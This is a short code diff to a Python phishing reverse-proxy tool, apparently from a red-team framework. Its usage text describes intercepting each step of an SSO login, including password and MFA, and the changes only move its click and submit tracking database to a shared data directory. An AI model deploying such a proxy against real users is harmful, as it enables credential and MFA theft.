@@ -7,7 +7,7 @@
   4. 支持 SSO 多步流(用户名→密码→MFA),每步都拦截
 用法:
   phish-proxy.py serve --listen :8080 --target https://login.target.com \
-      --db /tmp/phish-track.json [--strip-csp] [--replace-host]
+      [--db <数据根>/tools/phish/track.json] [--strip-csp] [--replace-host]
 """
 import sys, os, json, time, hashlib, re
 from http.server import HTTPServer, BaseHTTPRequestHandler
@@ -48,12 +48,12 @@ def scope_gate_full():
 # CS8-P1-4: 缺省与链路同源(phish-send/phish-track/漏斗都指向数据根
 # tools/phish——此前 /tmp 使经代理的 click/submit 对 campaigns 面板
 # 永久不可见)。容器位 /opt/tools, 宿主位 SPECTRE_DATA_DIR。
-import os as _po
-def _pdata_root():
-    if _po.path.exists('/opt/tools/bootstrap-sandbox.sh'):
+def _data_root():
+    """数据根(R32D36 双运行位唯一制式): 容器 /opt/tools 挂载; 宿主 SPECTRE_DATA_DIR。"""
+    if os.path.exists('/opt/tools/bootstrap-sandbox.sh'):
         return '/opt/tools'
-    return _po.path.join(_po.environ.get('SPECTRE_DATA_DIR', '/var/lib/spectre'), 'tools')
-DB_FILE = _po.path.join(_pdata_root(), 'phish/track.json')
+    return os.path.join(os.environ.get('SPECTRE_DATA_DIR', '/var/lib/spectre'), 'tools')
+DB_FILE = os.path.join(_data_root(), 'phish/track.json')
 
 def load_db():
     try: return json.load(open(DB_FILE))
